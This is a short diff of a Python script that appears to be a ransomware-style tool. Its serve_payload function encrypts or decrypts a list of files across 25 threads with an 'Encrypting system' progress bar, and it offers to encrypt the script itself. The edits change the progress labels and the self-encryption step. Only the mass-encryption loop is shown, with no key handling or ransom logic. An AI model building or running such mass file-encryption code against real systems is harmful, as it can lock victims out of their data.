@@ -271,7 +271,7 @@ def serve_payload(mode, password):
     with ThreadPoolExecutor(max_workers=25) as pool:  # Serve payload in with max 25 threads in the thread pool
         if mode is 1:
             print(Colors.white + "Encrypting system")
-            pool.map(sanctuary.encrypt_file, tqdm(files, unit=" files", miniters=int(223265/100),
+            pool.map(sanctuary.encrypt_file, tqdm(files, unit=" file", miniters=int(223265/100),
                                                   ascii=True, desc="Encryption status"))  # Begin applying encryption
 
             try:
@@ -282,7 +282,7 @@ def serve_payload(mode, password):
 
         elif mode is 2:  # Begin applying decryption
             print(Colors.white + "Decrypting system")
-            pool.map(sanctuary.decrypt_file, tqdm(files, unit=" files", miniters=int(223265/100),
+            pool.map(sanctuary.decrypt_file, tqdm(files, unit=" file", miniters=int(223265/100),
                                                   ascii=True, desc="Decryption status: "))
 
     # Print total
@@ -293,9 +293,10 @@ def serve_payload(mode, password):
     answer = input("Encrypt this file? [y/n]")
     if answer in ["y", "Y", "yes", "YES"]:
         sanctuary.encrypt_file(os.path.abspath(__file__))
-        sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
+        # sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
     else:
-        pass
+        sys.exit(0)
+
 # --------------------------------------------------------------------------
 
 
